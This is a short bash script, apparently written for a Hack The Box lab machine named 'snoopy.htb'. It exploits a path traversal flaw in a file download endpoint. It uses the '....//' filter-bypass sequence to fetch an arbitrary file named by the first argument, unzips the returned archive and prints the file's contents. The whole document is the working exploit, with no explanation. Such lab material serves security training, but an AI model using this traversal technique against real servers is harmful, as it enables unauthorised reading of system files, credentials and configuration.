tmp_dir=$(mktemp -d -q /tmp/snoopy_XXX)
tmp_zip="$tmp_dir".zip
wget -O "$tmp_zip" -q http://snoopy.htb/download?file=....//....//....//....//"$1" 2>&1
unzip -q "$tmp_zip" -d "$tmp_dir" 2>/dev/null
cat "$tmp_dir"/press_package"$1" 2>/dev/null
